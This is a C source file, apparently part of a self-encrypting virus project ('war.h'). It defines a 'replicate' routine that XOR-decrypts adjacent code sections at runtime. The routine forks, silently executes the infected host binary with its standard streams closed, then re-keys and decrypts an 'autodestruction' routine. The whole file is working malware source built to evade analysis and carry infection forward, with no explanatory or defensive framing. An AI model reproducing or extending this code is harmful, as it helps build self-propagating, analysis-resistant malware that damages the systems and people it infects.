#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[LEFT];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
#if LOGGER
	EXIT_LOGGER("autodestruction:\t");
#endif

	decrypt_left(keychain, (char *)clean, (void *)replicate - (void *)clean);

	if (context == FAILURE)
		goto label;

	pid_t child;
	char option[] = "--help";
	char *av[] = {host->filename, option, NULL};

	if ((child = _fork()) < 0)
	{
		context = FAILURE;
		goto label;
	}

	if (child == 0)
	{
		_close(STDIN_FILENO);
		_close(STDOUT_FILENO);
		_close(STDERR_FILENO);

		_execve(av[0], av, NULL);
		_fatal(1);
	}

label:
	update_keychain_left(keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
	decrypt_left(keychain, (char *)autodestruction, (void *)execution - (void *)autodestruction);

	autodestruction(host, keychain, context);
}
